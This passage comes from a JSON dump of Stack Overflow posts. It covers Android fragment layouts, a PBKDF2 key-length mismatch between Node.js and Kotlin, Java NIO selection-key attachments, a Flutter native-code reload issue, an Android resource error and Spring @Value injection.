android:layout_width=&quot;match_parent&quot;\n    android:layout_height=&quot;match_parent&quot;\n    tools:context=&quot;.ui.gallery.GalleryFragment&quot;&gt;\n\n    &lt;EditText\n        android:id=&quot;@+id/EditProva&quot;\n        android:layout_width=&quot;wrap_content&quot;\n        android:layout_height=&quot;wrap_content&quot;\n        android:layout_marginTop=&quot;100sp&quot;\n        android:foregroundGravity=&quot;center_horizontal&quot;\n        android:gravity=&quot;center_horizontal&quot;\n        android:padding=&quot;40sp&quot;\n        android:text=&quot;Inserire qualcosa di prova&quot;\n        app:layout_constraintEnd_toEndOf=&quot;parent&quot;\n        app:layout_constraintStart_toStartOf=&quot;parent&quot; /&gt;\n    &lt;Button\n        android:id=&quot;@+id/button_prova&quot;\n        android:layout_width=&quot;wrap_content&quot;\n        android:layout_height=&quot;wrap_content&quot;\n        android:text=&quot;Prova&quot;\n        app:layout_constraintTop_toBottomOf=&quot;@+id/EditProva&quot;\n        tools:layout_editor_absoluteX=&quot;150dp&quot; /&gt;\n&lt;/androidx.constraintlayout.widget.ConstraintLayout&gt;\n\n</code></pre>\n<p><strong>activity_maps.xml</strong></p>\n<pre><code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;\n&lt;FrameLayout xmlns:android=&quot;http://schemas.android.com/apk/res/android&quot;\n    xmlns:tools=&quot;http://schemas.android.com/tools&quot;\n    android:layout_width=&quot;match_parent&quot;\n    android:layout_height=&quot;match_parent&quot;\n    tools:context=&quot;.ui.deter.DeterminaFrag&quot;&gt;\n\n\n    &lt;fragment\n        android:id=&quot;@+id/map&quot;\n        android:name=&quot;com.google.android.gms.maps.SupportMapFragment&quot;\n        android:layout_width=&quot;match_parent&quot;\n        android:layout_height=&quot;550dp&quot;\n        tools:context=&quot;.MapsActivity&quot;\n        tools:layout=&quot;@android:layout/simple_spinner_dropdown_item&quot; /&gt;\n\n    &lt;EditText\n        android:id=&quot;@+id/editText&quot;\n        android:layout_width=&quot;wrap_content&quot;\n        android:layout_height=&quot;wrap_content&quot;\n        android:layout_marginStart=&quot;30dp&quot;\n        android:layout_marginTop=&quot;550dp&quot;\n        android:ems=&quot;10&quot;\n        android:hint=&quot;Latitudine&quot;\n        android:inputType=&quot;textPersonName&quot;\n        android:autofillHints=&quot;&quot; /&gt;\n\n    &lt;EditText\n        android:id=&quot;@+id/editText2&quot;\n        android:layout_width=&quot;wrap_content&quot;\n        android:layout_height=&quot;wrap_content&quot;\n        android:layout_marginStart=&quot;220dp&quot;\n        android:layout_marginTop=&quot;550dp&quot;\n        android:ems=&quot;10&quot;\n        android:hint=&quot;Longitudine&quot;\n        android:inputType=&quot;textPersonName&quot;\n        android:autofillHints=&quot;&quot; /&gt;\n\n    &lt;Button\n        android:id=&quot;@+id/button&quot;\n        android:layout_width=&quot;wrap_content&quot;\n        android:layout_height=&quot;wrap_content&quot;\n        android:layout_marginStart=&quot;150dp&quot;\n        android:layout_marginTop=&quot;600dp&quot;\n        android:onClick=&quot;updateButtonOnclick&quot;\n        android:text=&quot;Aggiorna&quot; /&gt;\n\n&lt;/FrameLayout&gt;\n</code></pre>\n<p><strong>content_main.xml</strong></p>\n<pre><code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;\n&lt;androidx.constraintlayout.widget.ConstraintLayout xmlns:android=&quot;http://schemas.android.com/apk/res/android&quot;\n    xmlns:app=&quot;http://schemas.android.com/apk/res-auto&quot;\n    xmlns:tools=&quot;http://schemas.android.com/tools&quot;\n    android:layout_width=&quot;match_parent&quot;\n    android:layout_height=&quot;match_parent&quot;\n    app:layout_behavior=&quot;@string/appbar_scrolling_view_behavior&quot;\n    tools:showIn=&quot;@layout/app_bar_main&quot;&gt;\n\n    &lt;fragment\n        android:id=&quot;@+id/nav_host_fragment_content_main&quot;\n        android:name=&quot;androidx.navigation.fragment.NavHostFragment&quot;\n        android:layout_width=&quot;match_parent&quot;\n        android:layout_height=&quot;match_parent&quot;\n        app:defaultNavHost=&quot;true&quot;\n        app:layout_constraintLeft_toLeftOf=&quot;parent&quot;\n        app:layout_constraintRight_toRightOf=&quot;parent&quot;\n        app:layout_constraintTop_toTopOf=&quot;parent&quot;\n        app:navGraph=&quot;@navigation/mobile_navigation&quot; /&gt;\n&lt;/androidx.constraintlayout.widget.ConstraintLayout&gt;\n</code></pre>\n<p>I think the problem is in this code (in fact it does not even compile)</p>\n<pre><code>        btn.setOnClickListener(new View.OnClickListener() {\n            @Override\n            public void onClick(View view) {\n                FragmentActivity fragment = new DeterminaFrag();\n                FragmentManager fragmentManager = fragment.getSupportFragmentManager();\n                fragmentManager.beginTransaction().replace(R.id.nav_host_fragment_content_main, fragment);\n\n            }\n        });\n</code></pre>\n<p>I don't know if is possible to change this Fragment into a FragmentActivity. I have looked for similar questionsn but I haven't find anything.\nThank you for any help</p>\n"},{"tags":["java","node.js","encryption","pbkdf2"],"comments":[{"owner":{"account_id":12359353,"reputation":42427,"user_id":9014097,"display_name":"Topaco"},"score":0,"creation_date":1642451760,"post_id":70746760,"comment_id":125069587,"body_markdown":"I cannot reproduce the posted result of the Kotlin code. Probably the passwords don&#39;t match, which can&#39;t be said exactly since you didn&#39;t post the password used in the Kotlin code. In the NodeJS code the key length has to be specified in byte (32) and not as in the Kotlin code in bit (256), hence the different lengths of the generated keys.","body":"I cannot reproduce the posted result of the Kotlin code. Probably the passwords don&#39;t match, which can&#39;t be said exactly since you didn&#39;t post the password used in the Kotlin code. In the NodeJS code the key length has to be specified in byte (32) and not as in the Kotlin code in bit (256), hence the different lengths of the generated keys."},{"owner":{"account_id":7223272,"reputation":1,"user_id":5512905,"display_name":"lucas lumbex"},"score":0,"creation_date":1642484181,"post_id":70746760,"comment_id":125075811,"body_markdown":"Thanks for the insight @Topaco, the issue was the key length fixed the kotlin code by multiplying 256 * 8. You can go ahead and add it as the answer so I can accept it","body":"Thanks for the insight @Topaco, the issue was the key length fixed the kotlin code by multiplying 256 * 8. You can go ahead and add it as the answer so I can accept it"}],"owner":{"account_id":7223272,"reputation":1,"user_id":5512905,"display_name":"lucas lumbex"},"comment_count":2,"delete_vote_count":0,"reopen_vote_count":0,"close_vote_count":0,"is_answered":false,"view_count":242,"favorite_count":0,"down_vote_count":0,"up_vote_count":0,"answer_count":0,"score":0,"last_activity_date":1642480874,"creation_date":1642448936,"question_id":70746760,"body_markdown":"I have a node JS encryption that i am trying to translate to Java. But they have different results.\r\n\r\nNode \r\n\r\n    const salt = &#39;randomsalt&#39;\r\n    const crypt = pass =&gt; new Promise((resolve, reject) =&gt; {\r\n       crypto.pbkdf2(pass, salt, 1000, 256, &#39;sha1&#39;, (err, key) =&gt; {\r\n       if (err) reject(err)\r\n        resolve(key)\r\n      })\r\n    })\r\n\r\nJava\r\n\r\n      private val salt = &quot;randomsalt&quot;\r\n      val keyLength:Int = 256\r\n      val iterationCount:Int = 1000\r\n      private fun generateKey( pass: String): SecretKey? {\r\n        return try {\r\n            val factory = SecretKeyFactory.getInstance(&quot;PBKDF2WithHmacSHA1&quot;)\r\n            println(&quot;pass =&gt; $pass&quot;)\r\n            println(&quot;salt =&gt; ${salt.toByteArray()}&quot;)\r\n            val spec: KeySpec = PBEKeySpec(pass.toCharArray(), salt.toByteArray(), iterationCount, keyLength)\r\n            SecretKeySpec(factory.generateSecret(spec).encoded, &quot;AES&quot;)\r\n        } catch (e: NoSuchAlgorithmException) {\r\n            null\r\n        } catch (e: InvalidKeySpecException) {\r\n            null\r\n        }\r\n    }\r\n\r\n  Output: \r\n\r\n  JS\r\n\r\n        const password = &quot;password&quot;\r\n        const derivedKey = await crypt(password)\r\n        console.log(&#39;derivedKey =&gt;&#39;,  derivedKey.toString(&#39;base64&#39;)) //uYYJrIrFuAb42kCCOPjqAAE5b2XiECBcKWImxWWLvZ8TUT03ZxhJIs9o285jzAsxjEbyefQQSk6I01ZJOm0XveV3BUEAuhYnJRvyesSE7yrti+Lir8mQiRLiFgVfphs590xwuxqD7NhKohow7Vlw0AkdUXVoIFBOHs3VVaTz3cDthmZ8EhoGumU4XZBtiM01Z0e9MthlqOl4Ri0OSWr3SvqW8Yyz/LQvU0SP9EudRCE4MqbHy8vP06NzBFf7BCpHD7oqo61e1xaKmFjfJQgtK8KcLkjLthsDltbXN2PvmCc3z9L57sahba9iJctOSgpDhBXucA20LfM6nBXA1sqYnQ==\r\n\r\nJava\r\n\r\n     val password = &quot;password&quot;\r\n     val derivedKeyBytes = generateKey(password)?.encoded\r\n     val base64Key = Base64.getEncoder().encodeToString(derivedKeyBytes)\r\n     println(&quot;derivedKey $base64Key&quot;) //IC40btdTy83WnpQNWODFF8FO7eh8y8oLnncuKJBE29s=","title":"Node JS and Java pbkdf2 have different results","body":"<p>I have a node JS encryption that i am trying to translate to Java. But they have different results.</p>\n<p>Node</p>\n<pre><code>const salt = 'randomsalt'\nconst crypt = pass =&gt; new Promise((resolve, reject) =&gt; {\n   crypto.pbkdf2(pass, salt, 1000, 256, 'sha1', (err, key) =&gt; {\n   if (err) reject(err)\n    resolve(key)\n  })\n})\n</code></pre>\n<p>Java</p>\n<pre><code>  private val salt = &quot;randomsalt&quot;\n  val keyLength:Int = 256\n  val iterationCount:Int = 1000\n  private fun generateKey( pass: String): SecretKey? {\n    return try {\n        val factory = SecretKeyFactory.getInstance(&quot;PBKDF2WithHmacSHA1&quot;)\n        println(&quot;pass =&gt; $pass&quot;)\n        println(&quot;salt =&gt; ${salt.toByteArray()}&quot;)\n        val spec: KeySpec = PBEKeySpec(pass.toCharArray(), salt.toByteArray(), iterationCount, keyLength)\n        SecretKeySpec(factory.generateSecret(spec).encoded, &quot;AES&quot;)\n    } catch (e: NoSuchAlgorithmException) {\n        null\n    } catch (e: InvalidKeySpecException) {\n        null\n    }\n}\n</code></pre>\n<p>Output:</p>\n<p>JS</p>\n<pre><code>    const password = &quot;password&quot;\n    const derivedKey = await crypt(password)\n    console.log('derivedKey =&gt;',  derivedKey.toString('base64')) //uYYJrIrFuAb42kCCOPjqAAE5b2XiECBcKWImxWWLvZ8TUT03ZxhJIs9o285jzAsxjEbyefQQSk6I01ZJOm0XveV3BUEAuhYnJRvyesSE7yrti+Lir8mQiRLiFgVfphs590xwuxqD7NhKohow7Vlw0AkdUXVoIFBOHs3VVaTz3cDthmZ8EhoGumU4XZBtiM01Z0e9MthlqOl4Ri0OSWr3SvqW8Yyz/LQvU0SP9EudRCE4MqbHy8vP06NzBFf7BCpHD7oqo61e1xaKmFjfJQgtK8KcLkjLthsDltbXN2PvmCc3z9L57sahba9iJctOSgpDhBXucA20LfM6nBXA1sqYnQ==\n</code></pre>\n<p>Java</p>\n<pre><code> val password = &quot;password&quot;\n val derivedKeyBytes = generateKey(password)?.encoded\n val base64Key = Base64.getEncoder().encodeToString(derivedKeyBytes)\n println(&quot;derivedKey $base64Key&quot;) //IC40btdTy83WnpQNWODFF8FO7eh8y8oLnncuKJBE29s=\n</code></pre>\n"},{"tags":["java","java-nio"],"answers":[{"tags":[],"owner":{"account_id":9760,"reputation":85859,"user_id":18157,"accept_rate":100,"display_name":"Jim Garrison"},"down_vote_count":0,"up_vote_count":0,"is_accepted":false,"score":0,"last_activity_date":1642480401,"creation_date":1642480401,"answer_id":70750319,"question_id":70750051,"body_markdown":"Java is pass-by-value but object variables are references,so\r\n\r\n    selectionKey.attach(attr);\r\n\r\npasses a _reference_ to `attr`. Only the reference gets saved in the `SelectionKey`; a copy of `attr` is NOT made.  So when you add to `attr`, the `SelectionKey` object sees the change.","title":"Java NIO - Channel attachment is pass by value or reference?","body":"<p>Java is pass-by-value but object variables are references,so</p>\n<pre><code>selectionKey.attach(attr);\n</code></pre>\n<p>passes a <em>reference</em> to <code>attr</code>. Only the reference gets saved in the <code>SelectionKey</code>; a copy of <code>attr</code> is NOT made.  So when you add to <code>attr</code>, the <code>SelectionKey</code> object sees the change.</p>\n"}],"owner":{"account_id":2188579,"reputation":1604,"user_id":1936343,"accept_rate":48,"display_name":"voila"},"comment_count":0,"delete_vote_count":0,"reopen_vote_count":0,"close_vote_count":0,"is_answered":false,"view_count":165,"favorite_count":0,"down_vote_count":1,"up_vote_count":0,"answer_count":1,"score":-1,"last_activity_date":1642480401,"creation_date":1642477472,"question_id":70750051,"body_markdown":"I am in the process of learning Java NIO APIs and was able to understand how things work except `attachment` object. \r\n\r\nAs far as I understand, we can create `channels` like `socketChannels` and attach an object to them. Whenever there is an event on a given channel then we can pick it up and its attached object. \r\n\r\nHere, I have a requirement to modify this object (add one more key and value ) and register it with another channel say `upstream channel`. Think in terms of load balancer - Taking the request from frontend and passing it to `upstream channel` \r\n\r\nThe issue is when I am modifying the object for `upstream channel`, it gets modified for `socket channel` also. \r\n\r\nTo check this - I have simplified the code. Can you please let me know how `attachement` works. \r\n\r\n```\r\n\r\npublic class Main {\r\n    public static void main(String[] args)  {\r\n\r\n        try{\r\n            Selector selector = Selector.open();\r\n            ServerSocketChannel serverSocket = ServerSocketChannel.open();\r\n            serverSocket.bind(new InetSocketAddress(&quot;localhost&quot;, 10000));  \r\n            serverSocket.configureBlocking(false);\r\n\r\n            HashMap&lt;String, Object&gt; attr = new HashMap&lt;&gt;();\r\n            attr.put(&quot;channel_type&quot;,&quot;server&quot;);\r\n            attr.put(&quot;back_connection&quot;, &quot;&quot;);\r\n\r\n            SelectionKey selectionKey = serverSocket.register(selector, SelectionKey.OP_ACCEPT);\r\n            selectionKey.attach(attr);  ----&gt; 1 . I attach a object\r\n\r\n\r\n            while(true){\r\n\r\n                selector.selectNow();\r\n                Set&lt;SelectionKey&gt; selectionKeySet = selector.selectedKeys();\r\n                Iterator&lt;SelectionKey&gt; iter = selectionKeySet.iterator();\r\n                while(iter.hasNext()){\r\n\r\n                    selectionKey = iter.next();\r\n                    attr = (HashMap)selectionKey.attachment();  ------&gt; 3. Get the attachment object again from selectionKey \r\n\r\n                    System.out.println(selectionKey.channel());\r\n                    String channelType = (String)attr.get(&quot;channel_type&quot;);\r\n                    System.out.println( &quot;Key is &quot; + attr);  -----&gt; 4. It has random_value key is present in attr  \r\n\r\n                    if(selectionKey.isAcceptable() &amp;&amp; channelType.equals(&quot;server&quot;)){\r\n\r\n                        System.out.println(&quot;Server Connection is connected&quot;);\r\n                        UUID uuid = UUID.randomUUID();\r\n                        attr.put(&quot;random_value&quot;, uuid.toString());  ---&gt; 2. Here I have modified the attr object\r\n\r\n                    }\r\n\r\n\r\n                    iter.remove();\r\n                }\r\n\r\n            }\r\n        }\r\n\r\n        catch(Exception e){\r\n            System.out.println(&quot;Exception has occured in socket &quot; + e);\r\n        }\r\n    }\r\n\r\n```\r\n\r\nMy question is how come, when I added a `random_value` key in the hashmap, the attachment object for `serverSocket` changes automatically. \r\n\r\nAs per my understanding, it should be changing only when I am attaching the modified object again with the selectionKey of the channel.  \r\n","title":"Java NIO - Channel attachment is pass by value or reference?","body":"<p>I am in the process of learning Java NIO APIs and was able to understand how things work except <code>attachment</code> object.</p>\n<p>As far as I understand, we can create <code>channels</code> like <code>socketChannels</code> and attach an object to them. Whenever there is an event on a given channel then we can pick it up and its attached object.</p>\n<p>Here, I have a requirement to modify this object (add one more key and value ) and register it with another channel say <code>upstream channel</code>. Think in terms of load balancer - Taking the request from frontend and passing it to <code>upstream channel</code></p>\n<p>The issue is when I am modifying the object for <code>upstream channel</code>, it gets modified for <code>socket channel</code> also.</p>\n<p>To check this - I have simplified the code. Can you please let me know how <code>attachement</code> works.</p>\n<pre><code>\npublic class Main {\n    public static void main(String[] args)  {\n\n        try{\n            Selector selector = Selector.open();\n            ServerSocketChannel serverSocket = ServerSocketChannel.open();\n            serverSocket.bind(new InetSocketAddress(&quot;localhost&quot;, 10000));  \n            serverSocket.configureBlocking(false);\n\n            HashMap&lt;String, Object&gt; attr = new HashMap&lt;&gt;();\n            attr.put(&quot;channel_type&quot;,&quot;server&quot;);\n            attr.put(&quot;back_connection&quot;, &quot;&quot;);\n\n            SelectionKey selectionKey = serverSocket.register(selector, SelectionKey.OP_ACCEPT);\n            selectionKey.attach(attr);  ----&gt; 1 . I attach a object\n\n\n            while(true){\n\n                selector.selectNow();\n                Set&lt;SelectionKey&gt; selectionKeySet = selector.selectedKeys();\n                Iterator&lt;SelectionKey&gt; iter = selectionKeySet.iterator();\n                while(iter.hasNext()){\n\n                    selectionKey = iter.next();\n                    attr = (HashMap)selectionKey.attachment();  ------&gt; 3. Get the attachment object again from selectionKey \n\n                    System.out.println(selectionKey.channel());\n                    String channelType = (String)attr.get(&quot;channel_type&quot;);\n                    System.out.println( &quot;Key is &quot; + attr);  -----&gt; 4. It has random_value key is present in attr  \n\n                    if(selectionKey.isAcceptable() &amp;&amp; channelType.equals(&quot;server&quot;)){\n\n                        System.out.println(&quot;Server Connection is connected&quot;);\n                        UUID uuid = UUID.randomUUID();\n                        attr.put(&quot;random_value&quot;, uuid.toString());  ---&gt; 2. Here I have modified the attr object\n\n                    }\n\n\n                    iter.remove();\n                }\n\n            }\n        }\n\n        catch(Exception e){\n            System.out.println(&quot;Exception has occured in socket &quot; + e);\n        }\n    }\n\n</code></pre>\n<p>My question is how come, when I added a <code>random_value</code> key in the hashmap, the attachment object for <code>serverSocket</code> changes automatically.</p>\n<p>As per my understanding, it should be changing only when I am attaching the modified object again with the selectionKey of the channel.</p>\n"},{"tags":["java","flutter","android-studio","kotlin","dart"],"answers":[{"tags":[],"owner":{"account_id":7832478,"reputation":744,"user_id":5921906,"accept_rate":75,"display_name":"Sachin Dobariya"},"down_vote_count":0,"up_vote_count":0,"is_accepted":false,"score":0,"last_activity_date":1640604077,"creation_date":1640604077,"answer_id":70494789,"question_id":70494726,"body_markdown":"You need to reinstall the app as native doesnt support hot reload like flutter","title":"Flutter Android native code not saving changes unless I restart Android studio","body":"<p>You need to reinstall the app as native doesnt support hot reload like flutter</p>\n"},{"tags":[],"owner":{"display_name":"user16424217"},"down_vote_count":0,"up_vote_count":0,"is_accepted":false,"score":0,"last_activity_date":1642479499,"creation_date":1642479499,"answer_id":70750238,"question_id":70494726,"body_markdown":"go to  File-&gt;invalidate Caches/Restart,\r\nthen click on open for editing in Android Studio","title":"Flutter Android native code not saving changes unless I restart Android studio","body":"<p>go to  File-&gt;invalidate Caches/Restart,\nthen click on open for editing in Android Studio</p>\n"}],"owner":{"account_id":12460519,"reputation":23,"user_id":9515407,"display_name":"Ini Hood"},"comment_count":0,"delete_vote_count":0,"reopen_vote_count":0,"close_vote_count":0,"is_answered":false,"view_count":182,"favorite_count":0,"down_vote_count":0,"up_vote_count":0,"answer_count":2,"score":0,"last_activity_date":1642479499,"creation_date":1640603647,"question_id":70494726,"body_markdown":"I am facing a weird problem in android studio while using flutter. I am working on a complicated flutter project which requires some native code, so, am writing some platform code using flutter platform channel(writing for android), whenever I make changes to the code in the android platform and run the app, the code changes does not reflect on the app unless I restart Android studio. What could possibly go wrong?","title":"Flutter Android native code not saving changes unless I restart Android studio","body":"<p>I am facing a weird problem in android studio while using flutter. I am working on a complicated flutter project which requires some native code, so, am writing some platform code using flutter platform channel(writing for android), whenever I make changes to the code in the android platform and run the app, the code changes does not reflect on the app unless I restart Android studio. What could possibly go wrong?</p>\n"},{"tags":["java","android-studio"],"comments":[{"owner":{"account_id":6098078,"reputation":28937,"user_id":4758255,"display_name":"ישו אוהב אותך"},"score":0,"creation_date":1642349310,"post_id":70731565,"comment_id":125041884,"body_markdown":"Search `R.id.invalidRegex` in your project and remove it. Then, try to deleting `build` directory.","body":"Search <code>R.id.invalidRegex</code> in your project and remove it. Then, try to deleting <code>build</code> directory."},{"owner":{"display_name":"user16123931"},"score":0,"creation_date":1642410689,"post_id":70731565,"comment_id":125054371,"body_markdown":"Still not working :( Any other ideas ?","body":"Still not working :( Any other ideas ?"}],"answers":[{"tags":[],"owner":{"display_name":"user16123931"},"down_vote_count":0,"up_vote_count":0,"is_accepted":false,"score":0,"last_activity_date":1642478803,"creation_date":1642478803,"answer_id":70750166,"question_id":70731565,"body_markdown":"I&#39;ve found a file named `ids.xml` inside of my project&#39;s values folder which caused this error and **not in R.java** file.\r\n\r\nAfter deleting the **ids.xml** file, now its compiling without any errors.","title":"How to get rid of this resources file error in Android Studio?","body":"<p>I've found a file named <code>ids.xml</code> inside of my project's values folder which caused this error and <strong>not in R.java</strong> file.</p>\n<p>After deleting the <strong>ids.xml</strong> file, now its compiling without any errors.</p>\n"}],"owner":{"display_name":"user16123931"},"comment_count":2,"delete_vote_count":0,"reopen_vote_count":0,"close_vote_count":0,"is_answered":false,"view_count":189,"favorite_count":0,"down_vote_count":0,"up_vote_count":0,"answer_count":1,"score":0,"last_activity_date":1642478803,"creation_date":1642347265,"question_id":70731565,"body_markdown":"While getting the string from the resource file, I&#39;ve mistakenly used `R.id.invalidRegex` instead of `R.string.invalidRegex` and it showed an error and pressed `Alt + Enter` and created a new resource id instead of creating a string id.\r\n\r\nNow, the problem is, its not compiling and showing **Failed to compile values file**. \r\n\r\nHow do I get rid of this error ?\r\n\r\nThings I&#39;ve already tried ,\r\n\r\n   - Cleaning and rebuilding the project.\r\n   - Restarting the Android Studio.\r\n   - Deleting the `build` directory and rebuilding the project.\r\n \r\nAndroid Studio version - Arctic Fox | 2020.3.1 Patch 4\r\n\r\nThanks for the answer in advance :)","title":"How to get rid of this resources file error in Android Studio?","body":"<p>While getting the string from the resource file, I've mistakenly used <code>R.id.invalidRegex</code> instead of <code>R.string.invalidRegex</code> and it showed an error and pressed <code>Alt + Enter</code> and created a new resource id instead of creating a string id.</p>\n<p>Now, the problem is, its not compiling and showing <strong>Failed to compile values file</strong>.</p>\n<p>How do I get rid of this error ?</p>\n<p>Things I've already tried ,</p>\n<ul>\n<li>Cleaning and rebuilding the project.</li>\n<li>Restarting the Android Studio.</li>\n<li>Deleting the <code>build</code> directory and rebuilding the project.</li>\n</ul>\n<p>Android Studio version - Arctic Fox | 2020.3.1 Patch 4</p>\n<p>Thanks for the answer in advance :)</p>\n"},{"tags":["java","spring","spring-boot","hikaricp"],"comments":[{"owner":{"account_id":1646676,"reputation":4100,"user_id":1518100,"accept_rate":96,"display_name":"Lei Yang"},"score":1,"creation_date":1642066396,"post_id":70694131,"comment_id":124974783,"body_markdown":"the dash `-` should be avoided, please have a try?","body":"the dash <code>-</code> should be avoided, please have a try?"},{"owner":{"account_id":8261832,"reputation":135,"user_id":6212918,"accept_rate":58,"display_name":"prepare123"},"score":0,"creation_date":1642067170,"post_id":70694131,"comment_id":124975097,"body_markdown":"thank you very much lei yang! I just try that but I encountered same issue. but thank you for advice !","body":"thank you very much lei yang! I just try that but I encountered same issue. but thank you for advice !"},{"owner":{"account_id":4382488,"reputation":343,"user_id":6666688,"display_name":"java dev"},"score":0,"creation_date":1642070735,"post_id":70694131,"comment_id":124976546,"body_markdown":"The hyphen not the problem I using it always without any problem.","body":"The hyphen not the problem I using it always without any problem."},{"owner":{"account_id":4382488,"reputation":343,"user_id":6666688,"display_name":"java dev"},"score":0,"creation_date":1642070835,"post_id":70694131,"comment_id":124976582,"body_markdown":"can you try to replace .yml with .application for test only and try again?","body":"can you try to replace .yml with .application for test only and try again?"},{"owner":{"account_id":16871523,"reputation":706,"user_id":12199915,"display_name":"Alex"},"score":0,"creation_date":1642071527,"post_id":70694131,"comment_id":124976852,"body_markdown":"Did you try to log values on `dataSourceOracle` bean creation?","body":"Did you try to log values on <code>dataSourceOracle</code> bean creation?"},{"owner":{"account_id":8261832,"reputation":135,"user_id":6212918,"accept_rate":58,"display_name":"prepare123"},"score":0,"creation_date":1642076179,"post_id":70694131,"comment_id":124978490,"body_markdown":"thank you all!  \nI tried to log values and I confirmed values was null on OracleConfig.class!  the other side, every values was injected on HiveConfig.class","body":"thank you all!   I tried to log values and I confirmed values was null on OracleConfig.class!  the other side, every values was injected on HiveConfig.class"},{"owner":{"account_id":10777133,"reputation":7282,"user_id":7928721,"display_name":"samabcde"},"score":2,"creation_date":1642078752,"post_id":70694131,"comment_id":124979484,"body_markdown":"The yml you provided has syntax error. Please provide the actual yml. Or a yml that can reproduce the problem.","body":"The yml you provided has syntax error. Please provide the actual yml. Or a yml that can reproduce the problem."},{"owner":{"account_id":8261832,"reputation":135,"user_id":6212918,"accept_rate":58,"display_name":"prepare123"},"score":0,"creation_date":1642141139,"post_id":70694131,"comment_id":124997128,"body_markdown":"thank you for commnet samabcde ! I updated yml and I tested that ymls content can  read from HiveConfig.java. So I think currently my yml syntax isn&#39;t have problem.","body":"thank you for commnet samabcde ! I updated yml and I tested that ymls content can  read from HiveConfig.java. So I think currently my yml syntax isn&#39;t have problem."}],"answers":[{"tags":[],"owner":{"account_id":7036011,"reputation":23,"user_id":5390096,"display_name":"Anup"},"down_vote_count":0,"up_vote_count":0,"is_accepted":false,"score":0,"last_activity_date":1642478732,"creation_date":1642478732,"answer_id":70750160,"question_id":70694131,"body_markdown":"Have you tried with constructor injection? See if this works.\r\n\r\n    private boolean useCustomHive;\r\n    private String SomeOfSetting;\r\n        \r\n    HiveConfig (@Value(&quot;${hive.custom.use}&quot;) boolean useCustomHive, @Value(&quot;${hive.custom.some-of-setting}&quot;) String SomeOfSetting) {\r\n            this.useCustomHive = useCustomHive;\r\n            this.SomeOfSetting = SomeOfSetting;\r\n    }","title":"@Value isn&#39;t working on particular @Configuration class on Springboot","body":"<p>Have you tried with constructor injection? See if this works.</p>\n<pre><code>private boolean useCustomHive;\nprivate String SomeOfSetting;\n    \nHiveConfig (@Value(&quot;${hive.custom.use}&quot;) boolean useCustomHive, @Value(&quot;${hive.custom.some-of-setting}&quot;) String SomeOfSetting) {\n        this.useCustomHive = useCustomHive;\n        this.SomeOfSetting = SomeOfSetting;\n}\n</code></pre>\n"}],"owner":{"account_id":8261832,"reputation":135,"user_id":6212918,"accept_rate":58,"display_name":"prepare123"},"comment_count":8,"delete_vote_count":0,"reopen_vote_count":0,"close_vote_count":0,"is_answered":false,"view_count":967,"favorite_count":0,"down_vote_count":0,"up_vote_count":0,"answer_count":1,"score":0,"last_activity_date":1642478732,"creation_date":1642065966,"question_id":70694131,"body_markdown":"Hi I have been making spring boot project which have 2 of datasource.  \r\nI want to use those datasources properties&#39; value from application.yml file and  \r\nso that I configured @Configuration Class on our project.  \r\n\r\nBut, even if both of Configuration class was set same way, @Value annotation isn&#39;t working on the OracleConfig.class.\r\n\r\nI tested related oracle setting which wrote on application.yml file is working on the HiveConfig.class and I confirmed that.  \r\n\r\nhow can I inject value to OracleConfig.class :( ,,,\r\n\r\n&gt;I currently strongly doubt OracleConfig.class was working before @Value annotation or other Beans had been initialized. \r\nshould I configure order about bean creation process or (is that make sense)force that OracleConfig.java&#39;s @Bean will be created after injection of @Value?\r\n\r\n\r\nHiveConfig.class\r\n```\r\n@Configuration\r\npublic class HiveConfig {\r\n\r\n    @Value(&quot;${hive.custom.use}&quot;)\r\n    private boolean useCustomHive;\r\n    @Value(&quot;${hive.custom.some-of-setting}&quot;)\r\n    private String SomeOfSetting;\r\n\r\n    @Bean\r\n    @ConfigurationProperties(prefix = &quot;hive.datasource&quot;)\r\n    public HikariDataSource dataSourceHive() throws Exception {\r\n        HikariDataSource hikariDataSource = new HikariDataSource();\r\n\r\n        if (useCustomHive){\r\n            \r\n            hikariDataSource.SetSomeOfSetting(SomeOfSetting);\r\n        }\r\n\r\n        return hikariDataSource;\r\n    }\r\n```\r\n\r\nOracleConfig.class\r\n```\r\n@Configuration\r\npublic class OracleConfig {\r\n\r\n    @Value(&quot;${oracle.custom.use}&quot;)\r\n    private boolean useCustomOracle;\r\n    @Value(&quot;${oracle.custom.some-of-setting}&quot;)\r\n    private String SomeOfSetting;\r\n\r\n    @Bean\r\n    @ConfigurationProperties(prefix = &quot;oracle.datasource&quot;)\r\n    public HikariDataSource dataSourceOracle() throws Exception {\r\n        HikariDataSource hikariDataSource = new HikariDataSource();\r\n\r\n        if (useCustomOracle){\r\n            hikariDataSource.SetSomeOfSetting(SomeOfSetting);\r\n        }\r\n\r\n        return hikariDataSource;\r\n    }\r\n```\r\n\r\napplication.yml (this values(oracle and hive) can read from HiveConfig.class via @Value)\r\n```\r\noracle:\r\n  custom:\r\n    use:true\r\n    some-of-setting: str\r\nhive:\r\n  custom:\r\n    use:true\r\n    some-of-setting: str\r\n\r\n```\r\n\r\n","title":"@Value isn&#39;t working on particular @Configuration class on Springboot","body":"<p>Hi I have been making spring boot project which have 2 of datasource.<br />\nI want to use those datasources properties' value from application.yml file and<br />\nso that I configured @Configuration Class on our project.</p>\n<p>But, even if both of Configuration class was set same way, @Value annotation isn't working on the OracleConfig.class.</p>\n<p>I tested related oracle setting which wrote on application.yml file is working on the HiveConfig.class and I confirmed that.</p>\n<p>how can I inject value to OracleConfig.class :( ,,,</p>\n<blockquote>\n<p>I currently strongly doubt OracleConfig.class was working before @Value annotation or other Beans had been initialized.\nshould I configure order about bean creation process or (is that make sense)force that OracleConfig.java's @Bean will be created after injection of @Value?</p>\n</blockquote>\n<p>HiveConfig.class</p>\n<pre><code>@Configuration\npublic class HiveConfig {\n\n    @Value(&quot;${hive.custom.use}&quot;)\n    private boolean useCustomHive;\n    @Value(&quot;${hive.custom.some-of-setting}&quot;)\n    private String SomeOfSetting;\n\n    @Bean\n    @ConfigurationProperties(prefix = &quot;hive.datasource&quot;)\n    public HikariDataSource dataSourceHive() throws Exception {\n        HikariDataSource hikariDataSource = new HikariDataSource();\n\n        if (useCustomHive){\n            \n            hikariDataSource.SetSomeOfSetting(SomeOfSetting);\n        }\n\n        return hikariDataSource;\n    }\n</code></pre>\n<p>OracleConfig.class</p>\n<pre><code>@Configuration\npublic class OracleConfig {\n\n    @Value(&quot;${oracle.custom.use}&quot;)\n    private boolean useCustomOracle;\n    